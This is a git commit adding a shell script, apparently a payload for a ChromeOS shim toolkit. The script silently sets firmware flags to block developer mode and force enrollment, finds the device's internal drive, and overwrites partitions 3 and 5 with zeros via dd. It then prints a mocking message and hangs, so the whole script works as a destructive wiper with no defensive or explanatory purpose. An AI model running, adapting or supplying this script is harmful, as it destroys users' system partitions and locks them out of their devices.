a1e1bf73593815457fe0235bf6f992fd52194e6f
xz8f <163360403+crossjbly@users.noreply.github.com>
2025-12-06 13:15:23 -0700

    Create fanxql.sh

---
+++ badsh1mmer/scripts/fanxql.sh
@@ -0,0 +1,44 @@
+vpd -i RW_VPD -s block_devmode=1 >/dev/null 2>&1
+vpd -i RW_VPD -s check_enrollment=1 >/dev/null 2>&1
+crossystem block_devmode=1 >/dev/null 2>&1
+
+get_fixed_dst_drive() {
+	local dev
+	if [ -z "${DEFAULT_ROOTDEV}" ]; then
+		for dev in /sys/block/sd* /sys/block/mmcblk*; do
+			if [ ! -d "${dev}" ] || [ "$(cat "${dev}/removable")" = 1 ] || [ "$(cat "${dev}/size")" -lt 2097152 ]; then
+				continue
+			fi
+			if [ -f "${dev}/device/type" ]; then
+				case "$(cat "${dev}/device/type")" in
+				SD*)
+					continue;
+					;;
+				esac
+			fi
+			DEFAULT_ROOTDEV="{$dev}"
+		done
+	fi
+	if [ -z "${DEFAULT_ROOTDEV}" ]; then
+		dev=""
+	else
+		dev="/dev/$(basename ${DEFAULT_ROOTDEV})"
+		if [ ! -b "${dev}" ]; then
+			dev=""
+		fi
+	fi
+	echo "${dev}"
+}
+TARGET_DEVICE=$(get_fixed_dst_drive)
+if echo "$TARGET_DEVICE" | grep -q '[0-9]$'; then
+	TARGET_DEVICE_P="$TARGET_DEVICE"p
+else
+	TARGET_DEVICE_P="$TARGET_DEVICE"
+fi
+dd if=/dev/zero of="$TARGET_DEVICE_P"3 >/dev/null 2>&1
+dd if=/dev/zero of="$TARGET_DEVICE_P"5 >/dev/null 2>&1
+echo "get fanxql'd haha :whale:"
+sleep 0.5
+clear
+cat "$PAYLOAD_DIR/whale.txt"
+sleep infinity
